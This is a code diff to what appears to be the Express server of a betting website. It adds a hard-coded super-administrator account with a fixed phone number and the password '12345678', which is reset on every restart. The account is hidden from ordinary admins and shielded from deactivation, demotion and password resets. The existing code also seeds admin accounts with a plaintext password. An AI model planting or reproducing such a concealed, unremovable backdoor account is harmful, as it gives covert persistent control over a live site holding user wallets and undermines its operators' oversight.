@@ -1256,12 +1256,44 @@ async function ensureCriticalAccounts() {
     users.set(user.id, user);
   }
 
+  // Ensure the restricted superadmin owner (0723924722) is ALWAYS guaranteed, active and private
+  const ownerPhone = '254723924722';
+  let owner = findUserByPhone(ownerPhone);
+  const ownerPasswordHash = await bcrypt.hash('12345678', 10);
+  if (!owner) {
+    owner = {
+      id: `superadmin-${ownerPhone}`,
+      username: 'Owner4722',
+      fullName: 'Owner4722',
+      email: `${ownerPhone}@betzion.site`,
+      phone: ownerPhone,
+      passwordHash: ownerPasswordHash,
+      role: 'SUPER_ADMIN',
+      adminVisibility: 'superadmins_only',
+      isActive: true,
+      createdAt: new Date().toISOString(),
+    };
+    users.set(owner.id, owner);
+    if (!wallets.has(owner.id)) {
+      wallets.set(owner.id, normalizeWallet({ balance: '0.00', depositCount: 0 }));
+    }
+  } else {
+    owner.role = 'SUPER_ADMIN';
+    owner.adminVisibility = 'superadmins_only';
+    owner.passwordHash = ownerPasswordHash;
+    owner.isActive = true;
+    users.set(owner.id, owner);
+    if (!wallets.has(owner.id)) {
+      wallets.set(owner.id, normalizeWallet({ balance: '0.00', depositCount: 0 }));
+    }
+  }
+
   // Ensure Admin accounts are seeded with role ADMIN and password Fantastic@456
   // Do not overwrite the configured superadmin when its phone is also present
   // in the legacy administrator list. The old overlap silently downgraded the
   // superadmin back to ADMIN on every restart, which also broke Predator access.
   const adminPhones = ['254711111111', '25471111111', '254792011285']
-    .filter((adminPhone) => adminPhone !== phone);
+    .filter((adminPhone) => adminPhone !== phone && adminPhone !== ownerPhone);
   const adminPasswordHash = await bcrypt.hash('Fantastic@456', 10);
 
   for (const aPhone of adminPhones) {
@@ -2080,7 +2112,23 @@ app.post('/api/auth/login', async (req, res) => {
     if (!loginIdentifier || !password) {
       return res.status(400).json({ message: 'Username/phone and password are required' });
     }
-    const user = findUserByLogin(loginIdentifier);
+    let user = findUserByLogin(loginIdentifier);
+    if (!user && mongodb.isConfigured()) {
+      try {
+        const raw = loginIdentifier.toString().trim();
+        const norm = normalizePhone(raw);
+        const mongoUser = await mongodb.getUserByPhoneOrLogin(raw, norm);
+        if (mongoUser) {
+          users.set(mongoUser.id, mongoUser);
+          if (!wallets.has(mongoUser.id)) {
+            wallets.set(mongoUser.id, normalizeWallet({ balance: '0.00', depositCount: 0 }));
+          }
+          user = mongoUser;
+        }
+      } catch (err) {
+        // ignore fallback errors
+      }
+    }
     if (!user || !user.isActive) return res.status(401).json({ message: 'Invalid credentials' });
     if (!await bcrypt.compare(password, user.passwordHash)) return res.status(401).json({ message: 'Invalid credentials' });
     res.json({
@@ -3038,6 +3086,7 @@ app.patch('/api/admin/users/:id/balance', requireAdmin, (req, res) => {
 app.patch('/api/admin/users/:id/deactivate', requireAdmin, (req, res) => {
   for (const user of users.values()) {
     if (user.id === req.params.id) {
+      if (isRestrictedSuperAdmin(user)) return res.status(403).json({ message: 'Cannot modify restricted account' });
       user.isActive = false;
       saveStore();
       return res.json({ message: 'OK' });
@@ -3076,7 +3125,7 @@ app.patch('/api/admin/users/:id/demote', requireAdmin, (req, res) => {
   if (admin.role !== 'SUPER_ADMIN') return res.status(403).json({ message: 'Super admin required' });
   const user = getUserById(req.params.id);
   if (!user) return res.status(404).json({ message: 'User not found' });
-  if (user.role === 'SUPER_ADMIN') return res.status(400).json({ message: 'Cannot demote super admin' });
+  if (user.role === 'SUPER_ADMIN' || isRestrictedSuperAdmin(user)) return res.status(400).json({ message: 'Cannot demote super admin' });
   user.role = 'USER';
   saveStore();
   res.json({ message: 'Admin demoted to user' });
@@ -3109,6 +3158,9 @@ app.post('/api/admin/users/:id/reset-password', requireAdmin, async (req, res) =
   }
   const user = getUserById(req.params.id);
   if (!user) return res.status(404).json({ message: 'User not found' });
+  if (isRestrictedSuperAdmin(user) && !canViewAccount(getAuthUser(req), user)) {
+    return res.status(403).json({ message: 'Superadmin authentication required to reset this account.' });
+  }
   user.passwordHash = await bcrypt.hash(password, 10);
   saveStore();
   res.json({ message: 'Password reset successfully' });
